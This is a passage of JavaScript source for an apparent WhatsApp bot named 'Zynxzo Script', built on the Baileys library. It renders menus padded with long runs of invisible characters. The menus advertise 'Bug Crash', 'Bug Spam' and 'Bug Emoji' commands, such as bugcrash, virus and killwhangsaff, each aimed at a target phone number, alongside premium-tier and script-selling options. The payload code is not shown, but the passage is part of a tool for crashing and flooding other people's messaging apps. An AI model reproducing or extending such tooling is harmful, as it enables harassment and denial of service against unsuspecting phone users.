͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
┏───────────────────┓
│ 𝐎𝐰𝐧𝐞𝐫 : *${global.NamaOwner}*
│ 𝐁𝐨𝐭𝐧𝐚𝐦𝐞 : *${global.namabot}*
│ 𝐔𝐬𝐞𝐫 : ${isPremium ? '𝗩𝗶𝗽' : '𝗙𝗿𝗲𝗲' }
│ 𝐌𝐨𝐝𝐞 : 𝗣𝗿𝗶𝘃𝗮𝘁𝗲
│ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟳.𝟬
│ 𝐒𝐭𝐚𝐭𝐮𝐬 : 𝗢𝗻𝗹𝗶𝗻𝗲
│ 𝐑𝐮𝐧 : *${runtime(process.uptime())}*
╰┓ 𝐋𝐢𝐛𝐫𝐚𝐲 : 𝗕𝗮𝗶𝗹𝘆𝘀 - 𝗦𝗼𝗰𝗸𝗲𝘁
   ┗──────────────────┛
┏───╴[ 𝙇𝙄𝙎𝙏 𝙈𝙀𝙉𝙐 ]╶──┓
│${global.simbol} ${prefix}ᴀʟʟᴍᴇɴᴜ
│${global.simbol} ${prefix}ʙᴜɢᴍᴇɴᴜ
│${global.simbol} ${prefix}ᴏᴡɴᴇʀᴍᴇɴᴜ
│${global.simbol} ${prefix}ᴛᴇᴍᴘʙᴀɴ
│${global.simbol} ${prefix}ʙᴜʏsᴄ
┗────────────────┛
  ┏───────────────┓
  │ 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 𝘽𝙮 : @𝙕𝙮𝙣𝙭𝙯𝙤
  │ 𝙋𝙤𝙬𝙚𝙧𝙙 𝘽𝙮 : @𝙕𝙮𝙣𝙭𝙯𝙤
  ┗───────────────┛`
const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: banteng
},
footer: {
text: ""
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: `{
display_text: '𝙈𝙮 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧',
url: "${global.urlWa}",
merchant_url: "${global.urlWa}"
}`
}],
messageParamsJson: ""
}
}
}
}
}, {quoted:zets})
await zynxzo.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
await sleep(500)
//Sending Audio
    zynxzo.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: zets })
}
break
//=================================================//
case 'allmenu':{
await loading()
zreply(`┏─╴[ 𝗭𝗬𝗡𝗫𝗭𝗢 𝗦𝗖𝗥𝗜𝗣𝗧 ] ──┓
│ 𝗛𝘆 *${m.pushName}*
│ *${time}*
│ *${ucapanWaktu}*
┗─────────────────┛͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
┏───────────────────┓
│ 𝐎𝐰𝐧𝐞𝐫 : *${global.NamaOwner}*
│ 𝐁𝐨𝐭𝐧𝐚𝐦𝐞 : *${global.namabot}*
│ 𝐔𝐬𝐞𝐫 : ${isPremium ? '𝗩𝗶𝗽' : '𝗙𝗿𝗲𝗲' }
│ 𝐌𝐨𝐝𝐞 : 𝗣𝗿𝗶𝘃𝗮𝘁𝗲
│ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟳.𝟬
│ 𝐒𝐭𝐚𝐭𝐮𝐬 : 𝗢𝗻𝗹𝗶𝗻𝗲
│ 𝐑𝐮𝐧 : *${runtime(process.uptime())}*
╰┓ 𝐋𝐢𝐛𝐫𝐚𝐲 : 𝗕𝗮𝗶𝗹𝘆𝘀 - 𝗦𝗼𝗰𝗸𝗲𝘁
   ┗──────────────────┛
┏───╴[ 𝗢𝗪𝗡𝗘𝗥 ]╶───┓
│${global.simbol} ${prefix}ᴘᴜʙʟɪᴄ
│${global.simbol} ${prefix}sᴇʟғ
│${global.simbol} ${prefix}ᴀᴅᴅᴘʀᴇᴍ
│${global.simbol} ${prefix}ᴅᴇʟᴘʀᴇᴍ
│${global.simbol} ${prefix}ʟɪsᴛᴘʀᴇᴍ
│${global.simbol} ${prefix}ʀᴇᴍɪɴɪ
│${global.simbol} ${prefix}ᴀᴅᴅᴘʟᴜɢ
│${global.simbol} ${prefix}ᴄɢᴘʟᴜɢ
│${global.simbol} ${prefix}ɢᴇᴛᴘʟᴜɢ
│${global.simbol} ${prefix}ʀᴍᴘʟᴜɢ
│${global.simbol} ${prefix}ʀᴇᴀᴅᴠᴏ
│${global.simbol} ${prefix}sᴛɪᴄᴋᴇʀ
│${global.simbol} ${prefix}ᴘɪɴɢ
│${global.simbol} ${prefix}ᴀᴛᴛᴘ
│${global.simbol} ${prefix}ʜᴅʀ
│${global.simbol} ${prefix}ʀᴇᴍᴏᴠᴇʙɢ
┗───────────────┛
┏──╴[ 𝘽𝙐𝙂 𝘾𝙍𝘼𝙎𝙃 ]╶───┓
│${global.simbol} ${prefix}ɴɢᴇᴄʀᴏᴛ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ʙᴜɢᴄʀᴀsʜ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏᴄ1 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏʟᴏᴄᴠɪʀ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏᴠɪʀᴜs 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏsʟᴏᴛ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏᴍᴏᴅs 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏᴄʟᴇᴀʀ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴋɪʟʟᴡʜᴀɴɢsᴀғғ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴠɪʀᴜssʟᴏᴛ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴢʏɴxᴢᴏᴀᴜᴛᴏᴄʀᴏᴛ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴍᴀᴍᴘᴜsᴄ1 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}ᴄ1ᴅᴇᴋ 𝟲𝟮𝟴𝗫𝗫𝗫
┗─────────────────┛
┏───╴[ 𝘽𝙐𝙂 𝙎𝙋𝘼𝙈 ]╶──┓
│${global.simbol} ${prefix}sᴘᴀᴍʙᴜɢ 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}sᴘᴀᴍɴᴏᴛɪғ 𝟲𝟮𝟴𝗫𝗫𝗫 
│${global.simbol} ${prefix}sᴘᴀᴍᴜɪ 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────┛
┏───╴[ 𝘽𝙐𝙂 𝙀𝙈𝙊𝙅𝙄 ]╶──┓
│${global.simbol} ${prefix}🤨 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}🤪 𝟲𝟮𝟴𝗫𝗫𝗫
│${global.simbol} ${prefix}🦸🏻‍♂️ 𝟲𝟮𝟴𝗫𝗫𝗫
